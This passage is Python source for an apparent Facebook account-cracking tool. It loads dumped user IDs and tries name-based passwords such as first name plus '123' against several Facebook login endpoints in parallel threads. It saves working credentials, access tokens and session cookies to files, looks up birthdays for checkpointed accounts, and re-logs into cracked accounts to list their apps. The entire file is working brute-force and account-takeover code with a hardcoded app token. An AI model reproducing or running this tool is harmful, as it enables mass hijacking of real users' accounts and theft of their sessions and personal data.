"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"
])

def useragent():
	jeeck("\033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m Change User-Agent")
	jeeck("\033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Chek User-Agent")
	jeeck("\033[0;36m[\033[0;35m0\033[0;36m]\033[0;00m Exit or Back")
	_jeeclxnano = raw_input("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Input : ")
	uas(_jeeclxnano)
	
def uas(_jeeclxnano):
    if _jeeclxnano == '':
        jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wrong Input");jeda(2);uas(_jeeclxnano)
    elif _jeeclxnano in("1","01"):

   	jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Type ,JEECK, Use User Agent Defaults")
    	try:
    	    ua = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Enter User Agent : ")
            if ua in(""):
            	jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wrong Input ");jeda(2);_jeeck_proo_()

            elif ua in("JEECK","jeeck","Jeeck"):
            	ua_ = ("Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
                open("data/ua.txt","w").write(ua_);jeda(2)
                jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Change User Agent Defaults ");jeda(2);_jeeck_proo_()
            open("data/ua.txt","w").write(ua);jeda(2)
            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Change User Agent Sucses ");jeda(2);_jeeck_proo_()
        except KeyboardInterrupt:
			exit ("\x1b[0;91m• Error ") 
    elif _jeeclxnano in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s%s%s YOUR USER AGENT : %s%s"%(U,til,O,H,ua_));jeda(2);raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O));_jeeck_proo_()
        except IOError:
        	ua_ = '%s-'%(M)
    elif _jeeclxnano in("0","00"):
    	_jeeck_proo_()
    else:
        jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk Cook ");jeda(2);uas(_jeeclxnano)

class jeckoramadhanganteng:

    def __init__(self):
        self.id = []
    def jeeckxtampany(self):
        try:
            self.apk = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Enterl File Dump : ")
            self.id = open(self.apk).read().splitlines()
            print ('%s[%s+%s]%s Total Id%s => %s%s' %(B,J,B,S,M,H,len(self.id)))
        except:
            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m File Dump Not Failled Dump Id Back")
            raw_input("\033[0;36m[\033[0;35mENTER\033[0;36m]");_jeeck_proo_()
        unikers = raw_input("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Use Pasword Manual \033[0;33mY \033[0;00mor \033[0;33mO : ")
        if unikers in ('Y', 'y'):
            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Example : Jeeck12345 or jeckoganteng or jeeckGAMING")
            while True:
                pwx = raw_input("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Password : ")
                if pwx == '':
                    jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Dont Empty ")
                elif len(pwx)<=5:
                    jeeck("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Max Password 6 character")
                else:
                    def manual(brute=None): 
                        ind = raw_input("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Input : ")
                        if ind == '':
                            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk Input");manual()
                        elif ind in ('1', '01'):
                            print ('\n%s[%s+%s]%s Results %s[OK] %sSaved In %s=> %sOK/%s.txt'%(B,J,B,P,H,P,M,H,waktu));jeda(0.2)
                            print ('%s[%s+%s]%s Results %s[CP] %sSaved In %s=> %sCP/%s.txt'%(B,J,B,P,M,P,M,H,waktu));jeda(0.2)
                            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ON OF AIR PLANE IF NO RESULTS");jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _heck_ = akun.split('<=>')[0]
                                        log.submit(self.b_api, _heck_, brute)
                                    except: pass
                            os.remove(self.apk)
                            exit("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m FINISED")
                        elif ind in ('2', '02'):
                            print ('\n%s[%s+%s]%s Results %s[OK] %sSaved In %s=> %sOK/%s.txt'%(B,J,B,P,H,P,M,H,waktu));jeda(0.2)
                            print ('%s[%s+%s]%s Results %s[CP] %sSaved In %s=> %sCP/%s.txt'%(B,J,B,P,M,P,M,H,waktu));jeda(0.2)
                            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ON OF AIR PLANE IF NO RESULTS");jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _heck_ = akun.split('<=>')[0]
                                        log.submit(self.basic, _heck_, brute)
                                    except: pass
                            os.remove(self.apk)
                            exit("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m FINISED")
                        elif ind in ('3', '03'):
                            print ('\n%s[%s+%s]%s Results %s[OK] %sSaved In %s=> %sOK/%s.txt'%(B,J,B,P,H,P,M,H,waktu));jeda(0.2)
                            print ('%s[%s+%s]%s Results %s[CP] %sSaved In %s=> %sCP/%s.txt'%(B,J,B,P,M,P,M,H,waktu));jeda(0.2)
                            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ON OF AIR PLANE IF NO RESULTS");jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _heck_ = akun.split('<=>')[0]
                                        log.submit(self.mobil, _heck_, brute)
                                    except: pass
                            os.remove(self.apk)
                            exit("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m FINISED")
                        else:
                            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk Input");manual()
                    jeeck("\033[0;36m[\033[0;35m1\033[0;36m]\033[0;33m B-API \033[0;00m( \033[0;36mFAST \033[0;35m( \033[0;33mJEECK \033[0;00m)\033[0;35m) ")                                    
                    jeeck("\033[0;36m[\033[0;35m2\033[0;36m]\033[0;33m MBASIC \033[0;00m( \033[0;36mSELLOW \033[0;35m( \033[0;33mYAYAN XD \033[0;00m)\033[0;35m) ")                              
                    jeeck("\033[0;36m[\033[0;35m3\033[0;36m]\033[0;33m MOBILE \033[0;00m( \033[0;36mS. SELLOW \033[0;35m( \033[0;33mRISKY \033[0;00m)\033[0;35m)")
                    manual(pwx.split(','))
                    break
        elif unikers in ('o', 'O'):
           
            jeeck("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Methode Stars Crack ")
            jeeck("\033[0;36m[\033[0;35m1\033[0;36m]\033[0;33m B-API \033[0;00m( \033[0;36mFAST \033[0;35m( \033[0;33mJEECK \033[0;00m)\033[0;35m) ")
            jeeck("\033[0;36m[\033[0;35m2\033[0;36m]\033[0;33m MBASIC \033[0;00m( \033[0;36mSELLOW \033[0;35m( \033[0;33mYAYAN XD \033[0;00m)\033[0;35m) ")
            jeeck("\033[0;36m[\033[0;35m3\033[0;36m]\033[0;33m MOBILE \033[0;00m( \033[0;36mS. SELLOW \033[0;35m( \033[0;33mRISKY \033[0;00m)\033[0;35m)")
            self.langsung()
        else:
            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m WRONK INPUT :(");jeda(2);_jeeck_proo_()
    
    def langsung(self):
        mrjeeckperudallaccountkegelapanxxznanowibu = raw_input("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Input :")
        if mrjeeckperudallaccountkegelapanxxznanowibu == '':
            print("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk INput ");self.langsung()
        elif mrjeeckperudallaccountkegelapanxxznanowibu in ('1', '01'):
            print ('\n%s[%s+%s]%s Results %s[OK] %sSaved In %s=> %sOK/%s.txt'%(B,J,B,P,H,P,M,H,waktu));jeda(0.2)
            print ('%s[%s+%s]%s Results %s[CP] %sSaved In %s=> %sCP/%s.txt'%(B,J,B,P,M,P,M,H,waktu));jeda(0.2)
            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ON OF AIR PLANE IF NO RESULTS\n");jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.b_api, uid, pwx)
                    except: pass
            os.remove(self.apk)
            exit("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m FINISED.......")
        elif mrjeeckperudallaccountkegelapanxxznanowibu in ('2', '02'):
            print ('\n%s[%s+%s]%s Results %s[OK] %sSaved In %s=> %sOK/%s.txt'%(B,J,B,P,H,P,M,H,waktu));jeda(0.2)
            print ('%s[%s+%s]%s Results %s[CP] %sSaved In %s=> %sCP/%s.txt'%(B,J,B,P,M,P,M,H,waktu));jeda(0.2)
            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ON OF AIR PLANE IF NO RESULTS\n");jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk)
            exit("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m FINISED.....")
        elif mrjeeckperudallaccountkegelapanxxznanowibu in ('3', '03'):
            print ('\n%s[%s+%s]%s Results %s[OK] %sSaved In %s=> %sOK/%s.txt'%(B,J,B,P,H,P,M,H,waktu));jeda(0.2)
            print ('%s[%s+%s]%s Results %s[CP] %sSaved In %s=> %sCP/%s.txt'%(B,J,B,P,M,P,M,H,waktu));jeda(0.2)
            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ON OF AIR PLANE IF NO RESULTS\n");jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk)
            exit("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m FINISED......")
        else:
            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk Input");self.langsung()
    
    def b_api(self, user, manual):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in manual:
            pw = pw.lower()
            ses = requests.Session()
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            bapi = "https://b-api.facebook.com/method/auth.login"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m PLEASE ON AIRPLANE 4 SECONDS"),
                sys.stdout.flush()
                loop +=1
                b_api(self, user, manual)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s*--> %s • %s • %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s • %s • %s'%(user,pw,response.json()['access_token']))
                open('OK/%s.txt'%(waktu), 'a').write(' *-->%s %s • %s • %s\n'%(P,user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    jeeckxd = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,jeeckxd)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan12[month]
                    print '\r %s*--> %s • %s • %s %s %s  ' % (K,user,pw,day,month,year)
                    
                    cp.append("%s • %s • %s %s %s"%(user,pw,day,month,year))
                    open('CP/%s.txt' %(waktu), 'a').write(" *--> %s • %s • %s %s %s\n"% (user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print ('\r %s*--> %s • %s            '%(K,user,pw))
                
                cp.append('%s • %s'%(user,pw))
                open('CP/%s.txt' %(waktu), 'a').write(" *--> %s • %s\n" % (user,pw))
                break
                continue
        loop += 1
        print('\r%s Cracking%s %s/%s [OK:%s]-[CP:%s]'%(U,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    
    def basic(self, user, manual):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in manual:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" %(key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\r %s*--> %s • %s • %s  '%(H,user,pw,kuki))
                
                ok.append('%s • %s • %s'%(user,pw,kuki))
                open('OK/%s.txt'%(waktu), 'a').write(' *--> %s • %s • %s\n'%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    jeeckxd = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,jeeckxd)).json()['birthday']
                    day, month, year = lahir.split('/')
                    month = bulan12[month]
                    print ('\r %s*--> %s • %s • %s %s %s '%(K,user,pw,day,month,year))
                    
                    cp.append("%s • %s • %s %s %s"%(user,pw,day,month,year))
                    open('CP/%s.txt' %(waktu), 'a').write(" *--> %s • %s • %s %s %s\n"% (user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except:pass
                print ('\r %s*--> %s • %s            '%(K,user,pw))
                
                cp.append('%s • %s'%(user,pw))
                open('CP/%s.txt' %(waktu), 'a').write(" *--> %s • %s\n" % (user,pw))
                break
                continue
                
        loop += 1
        print('\r%s Cracking%s %s/%s [OK:%s]-[CP:%s]'%(U,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    
    def mobil(self, user, manual):
    	global ok,cp,loop
        for pw in manual:
            pw = pw.lower()
            try:
            	ua = open('data/ua.txt', 'r').read()
            except IOError:
            	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for _mi_ in b('input'):
            	if _mi_.get('value') is None:
            	    if _mi_.get('name') == 'email':
            	        data.update({"email":user})
                    elif _mi_.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({_mi_.get('name'): ''})
                else:
                	data.update({_mi_.get('name'): _mi_.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd','__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" %(key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\r %s*--> %s • %s • %s  '%(H,user,pw,kuki))
               
                ok.append('%s • %s • %s'%(user,pw,kuki))
                open('OK/%s.txt'%(waktu), 'a').write(' *--> %s • %s • %s\n'%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    jeeckxd = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,jeeckxd)).json()['birthday']
                    day, month, year = lahir.split('/')
                    month = bulan12[month]
                    print ('\r %s*--> %s • %s • %s %s %s '%(K,user,pw,day,month,year))
                    cp.append("%s • %s • %s %s %s"%(user,pw,day,month,year))
                    open('CP/%s.txt' %(waktu), 'a').write(" *--> %s • %s • %s %s %s\n"% (user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except:pass
                print ('\r %s*--> %s • %s            '%(K,user,pw))
                cp.append('%s • %s'%(user,pw))
                open('CP/%s.txt' %(waktu), 'a').write(" *--> %s • %s\n" % (user,pw))
                break
                continue
                
        loop += 1
        print('\r%s Cracking%s %s/%s [OK:%s]-[CP:%s]'%(U,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()

def jeeck_log(user, pw, opsi_):
    ua = "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36"
    mb = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for _i_ in fm.find_all("input"):
        if i.get("name") in list:
            data.update({_i_.get("name"):_i_.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pw})
    try:
        run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("%s• redirect overload "%(M))
    if "c_user" in ses.cookies:
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
        otw = ses.get(run,cookies={'cookie':kuki})
        gem = parser(otw.content,'html.parser')
        apk = gem.find('form',method='post')
        print("%s%s Sucess • %s "%(H,til,kuki));jeda(0.07)
        _no_ = 0
        for app in apk.find_all("h3"):
        	data = app.find('span')
        	_no_+=1
        	jalan("  %s0%s. %s%s "%(P,str(_no_),H,data))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
        xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        opsi=[]
        opsi_cek = []
        for _o_ in range(len(ngew)):
            opsi_cek.append("\n  %s0%s. %s%s "%(P,str(_o_+1),K,ngew[_o_]))
        print(opsi_+"".join(opsi_cek))
    elif "login_error" in str(run):
        pass
    else:
        pass

def jeeck_cp():
    dirs = os.listdir('CP')
    
    for file in dirs:
        print("%s+%s => %s%s"%(J,M,K,file));jeda(0.07)
    try:
    	print("\n%s[%s+%s]%s Enter File Name [ Xample%s: %s%s.txt%s ]"%(B,J,B,P,M,K,waktu,O))
        opsi()
    except NameError:
        jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m File Not Faund ");exit()
def opsi():
	CP = ("CP/")
	jeeckxtampan = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Name File : ")
	if jeeckxtampan == "":
		jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk Input");jeda(2);opsi()
	try:
		jeeck_cp = open(CP+jeeckxtampan, "r").readlines()
	except IOError:
		exit("\n%s[%s+%s] nama file %s tidak tersedia"%(B,J,B,jeeckxtampan))
	jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════")
	print("%s[%s+%s]%s Total Account %s: %s%s"%(B,J,B,P,M,P,len(jeeck_cp)));jeda(2)
	jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ═════════════════════════[JEECK X NANO]════════════════════════")
	for fb in jeeck_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" • ")
		print("\n%s[%s+%s]%s Account Checked %s: %s%s"%(B,J,B,P,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n%s[%s+%s] FINISED "%(B,J,B,));jeda(0.07)
	raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,));jeda(0.07)
	_jeeck_proo_()
def mengecek(user, pw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "29-November-2021.txtmax-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for _i_ in fm.find_all("input"):
		if _i_.get("name") in list:
			data.update({_i_.get("name"):_i_.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pw})
	try:
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except requests.exceptions.TooManyRedirects:
		print("%s• redirect overload "%(M))
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
		otw = ses.get(run,cookies={'cookie':kuki})
		gem = parser(otw.content,'html.parser')
		apk = gem.find('form',method='post')
		print("%s[%s+%s]%s Sucess • %s "%(B,J,B,P,kuki));jeda(0.07)
		_no_ = 0
		for app in apk.find_all("h3"):
			data = app.find('span').text
			_no_+=1
			jalan("  %s0%s. %s%s "%(P,str(_no_),H,data))
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		sesi = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in sesi.find_all("option")]
		print("%s%s%s terdapat %s0%s%s opsi %s: "%(U,til,O,P,str(len(ngew)),O,M));jeda(0.07)
		for _o_ in range(len(ngew)):
			jalan("  %s0%s. %s%s "%(P,str(_o_+1),K,ngew[_o_]))
	elif "login_error" in str(run):
		eror = run.find("div",{"id":"login_error"}).find("div").text
		print("%s+ %s"%(B,eror));jeda(0.07)
	else:
		jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Login On Account Eror Or Password On Change");jeda(0.07)

def aplikasi(berhasil,kuki):
	a = []
	run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
	otw = ses.get(run,cookies={'cookie':kuki})
	gem = parser(otw.content,'html.parser')
	apk = gem.find('form',method='post')
	_no_ = 0
	for app in apk.find_all("h3"):
		try:
			data = app.find('span').text
			_no_+=1
			a.append("  %s0%s. %s%s "%(P,str(_no_),H,data))
		except:
			pass
# ...lan
def _jeeck_proo_():
    os.system('clear')
    try:
    	jeeckxd = open('data/token.txt', 'r').read()
    except IOError:
        jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m TOKEN NOT DETECTED ");jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+jeeckxd,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m TOKEN NOT DETECTED");jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Conectiont In Fallid")
    banner()
    jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Your Name : %s "%(nama))

    jeeck("\n\033[0;36m[\033[0;35m01\033[0;36m]\033[0;35m _jeeck_proo__Instgaram")
    jeeck("\033[0;36m[\033[0;35m02\033[0;36m]\033[0;35m Stars Crack_Fb")
    print("\033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Dump Id Reactiont Post")
    print("\033[0;36m[\033[0;35m04\033[0;36m]\033[0;00m Dump Id Froms Group \033[0;33m[ \033[0;36mMAXS \033[0;00m3000+ \033[0;33m]")
